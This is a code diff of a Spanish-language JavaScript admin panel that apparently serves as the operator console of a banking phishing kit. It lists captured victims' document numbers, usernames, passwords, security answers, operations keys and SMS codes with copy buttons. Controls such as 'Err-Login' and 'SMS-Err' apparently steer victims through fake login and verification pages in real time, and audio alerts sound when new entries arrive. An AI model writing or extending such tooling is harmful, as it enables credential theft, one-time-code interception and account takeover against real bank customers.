@@ -11,9 +11,9 @@ import {
   getDoc,
   setDoc
 } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
-import { firebaseConfig, appConfig } from "./firebase-config.js";
-// Inicializar Firebase usando la configuración importada
-const app = initializeApp(firebaseConfig);
+// NOTA: firebaseConfig y appConfig se cargan desde firebase-config.js como variables globales
+// Inicializar Firebase usando la configuración global
+const app = initializeApp(window.firebaseConfig);
 const db = getFirestore(app);
 // Exponer funciones de Firestore para uso global si es necesario
 window.db = db;
@@ -934,8 +934,7 @@ function updateUI(docs) {
             const tipo = userData.tipo || '';
             const userPage = userData.page || 0;
             const userPasswd = userData.clave || 0;
-            const respuestaSeguridad1 = userData.respuestaSeguridad1 || '';
-            const respuestaSeguridad2 = userData.respuestaSeguridad2 || '';
+            const userDocumento = userData.numeroDocumento || 0;
             const claveOperaciones = userData.claveOperaciones || '';
             // Procesar todos los usuarios, incluso los que están en la página inicial (page=4)
             totalActive++;
@@ -981,11 +980,10 @@ function updateUI(docs) {
                     <span class="badge badge-${statusClass}">${statusText}</span>
                     </div>
                 <div style="margin: 20px 0px 0px 20px; color: ${textColor};">
+                <p class="mb-0" style="color: ${textColor};">Documento: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${userDocumento}" title="Haz clic para copiar">${userDocumento} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                 <p class="mb-0" style="color: ${textColor};">Usuario: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${userId}" title="Haz clic para copiar">${userId} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
-                <p class="mb-0" style="color: ${textColor};">Clave: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${userPasswd}" title="Haz clic para copiar">${userPasswd} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
-                <p class="mb-0" style="color: ${textColor};">Pregunta 1: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${respuestaSeguridad1}" title="Haz clic para copiar">${respuestaSeguridad1} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
-                <p class="mb-0" style="color: ${textColor};">Pregunta 2: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${respuestaSeguridad2}" title="Haz clic para copiar">${respuestaSeguridad2} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
-                <p class="mb-0" style="color: ${textColor};">COE: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${claveOperaciones}" title="Haz clic para copiar">${claveOperaciones} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
+                <p class="mb-0" style="color: ${textColor};">Contraseña: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${userPasswd}" title="Haz clic para copiar">${userPasswd} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
+                <p class="mb-0" style="color: ${textColor};">SMS: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${claveOperaciones}" title="Haz clic para copiar">${claveOperaciones} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                 </div>
               <div class="card-body">
                 <div class="mb-3">
@@ -1000,15 +998,13 @@ function updateUI(docs) {
                 </div>
                 <div class="btn-group btn-block">
                   <button class="btn btn-success action-btn mr-1 rounded" data-action="home" data-id="${userId}">Inicio</button>
-                  <button class="btn btn-info action-btn mr-1 rounded" data-action="coe" data-id="${userId}" >COE</button>
-                  <button class="btn btn-warning action-btn mr-1 rounded" data-action="passwd" data-id="${userId}">Clave</button>
-                  <button class="btn btn-success action-btn mr-1 rounded" data-action="dashboard" data-id="${userId}">Dashboard</button>
-                  <button class="btn btn-secondary action-btn mr-1 rounded" data-action="emp" data-id="${userId}">Salida-Empresa</button>
+                  <button class="btn btn-info action-btn mr-1 rounded" data-action="sms" data-id="${userId}" >SMS</button>
+                  <button class="btn btn-success action-btn mr-1 rounded" data-action="dashboard" data-id="${userId}">N/A</button>
+                  <button class="btn btn-secondary action-btn mr-1 rounded" data-action="emp" data-id="${userId}">N/A</button>
                 </div>
                 <div class="btn-group btn-block">
                   <button class="btn btn-danger action-btn mr-1 rounded" data-action="err_login" data-id="${userId}">Err-Login</button>
-                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="coe_err" data-id="${userId}" >COE-Err</button>
-                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="desf_err" data-id="${userId}">DESF-Err</button>
+                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="sms_err" data-id="${userId}" >SMS-Err</button>
                   <button class="btn btn-danger action-btn mr-1 rounded" data-action="remove" data-id="${userId}">Eliminar</button>
                 </div>
               </div>
@@ -1219,9 +1215,7 @@ document.addEventListener("DOMContentLoaded", async function() {
     
     // Inicializar sistema de audio
     console.log('🔊 Inicializando sistema de audio...');
-    loadAudioConfig();
-    setupAudioEventListeners();
-    updateAudioUI();
+    initializeAudioControls();
     initializeAudioPanelState();
 
     if (localStorage.getItem("adminLoggedIn") === "true") {
@@ -1766,6 +1760,114 @@ window.testPanelElements = function() {
         console.log("Usuarios en dropdown:", elements.coordUserSelect.options.length - 1);
     }
 };
+
+// ===== CONFIGURACIÓN DE AUDIO =====
+
+
+
+
+
+// Función para inicializar los controles de audio en el panel
+function initializeAudioControls() {
+    // Cargar configuración guardada
+    loadAudioConfig();
+    
+    // Referencias a elementos del DOM
+    const audioEnabled = document.getElementById('audio-enabled');
+    const volumeControl = document.getElementById('volume-control');
+    const volumeDisplay = document.getElementById('volume-display');
+    const notificationSound = document.getElementById('notification-sound');
+    const updateSound = document.getElementById('update-sound');
+    const testNotification = document.getElementById('test-notification');
+    const testUpdate = document.getElementById('test-update');
+    
+    if (!audioEnabled || !volumeControl || !volumeDisplay || !notificationSound || !updateSound) {
+        console.warn('⚠️ No se encontraron todos los elementos de configuración de audio');
+        return;
+    }
+    
+    // Establecer valores iniciales en los controles
+    audioEnabled.checked = audioConfig.enabled;
+    volumeControl.value = Math.round(audioConfig.volume * 100);
+    volumeDisplay.textContent = Math.round(audioConfig.volume * 100) + '%';
+    notificationSound.value = audioConfig.notificationSound;
+    updateSound.value = audioConfig.updateSound;
+    
+    // Event listeners
+    
+    // Habilitar/deshabilitar audio
+    audioEnabled.addEventListener('change', function() {
+        audioConfig.enabled = this.checked;
+        saveAudioConfig();
+        console.log(`🔊 Audio ${this.checked ? 'habilitado' : 'deshabilitado'}`);
+    });
+    
+    // Control de volumen
+    volumeControl.addEventListener('input', function() {
+        const volume = parseInt(this.value) / 100;
+        audioConfig.volume = volume;
+        volumeDisplay.textContent = this.value + '%';
+        saveAudioConfig();
+        console.log(`🔊 Volumen ajustado a: ${this.value}%`);
+    });
+    
+    // Selección de sonido para notificaciones
+    notificationSound.addEventListener('change', function() {
+        audioConfig.notificationSound = this.value;
+        saveAudioConfig();
+        console.log(`🔊 Sonido de notificación cambiado a: ${this.value}`);
+    });
+    
+    // Selección de sonido para actualizaciones
+    updateSound.addEventListener('change', function() {
+        audioConfig.updateSound = this.value;
+        saveAudioConfig();
+        console.log(`🔊 Sonido de actualización cambiado a: ${this.value}`);
+    });
+    
+    // Botón de prueba para notificaciones
+    if (testNotification) {
+        testNotification.addEventListener('click', function() {
+            console.log('🔊 Probando sonido de notificación...');
+            playNotificationSound();
+        });
+    }
+    
+    // Botón de prueba para actualizaciones
+    if (testUpdate) {
+        testUpdate.addEventListener('click', function() {
+            console.log('🔊 Probando sonido de actualización...');
+            playUpdateSound();
+        });
+    }
+    
+    console.log('🎵 Controles de audio inicializados correctamente');
+}
+
+// Función para probar un sonido específico
+function testSound(soundPath, volume = null) {
+    try {
+        const audio = new Audio(soundPath);
+        audio.volume = volume !== null ? volume : audioConfig.volume;
+        
+        const playPromise = audio.play();
+        if (playPromise !== undefined) {
+            playPromise
+                .then(() => {
+                    console.log(`🔊 Sonido de prueba reproducido: ${soundPath}`);
+                })
+                .catch(error => {
+                    console.warn('⚠️ Error reproduciendo sonido de prueba:', error);
+                    alert('Error reproduciendo el sonido. Verifique que el archivo existe y el navegador permite reproducción de audio.');
+                });
+        }
+    } catch (error) {
+        console.error('❌ Error creando objeto Audio para prueba:', error);
+        alert('Error creando el reproductor de audio.');
+    }
+}
+
+// ===== FIN CONFIGURACIÓN DE AUDIO =====
 
 // Función para inicializar el estado del panel de audio
 function initializeAudioPanelState() {
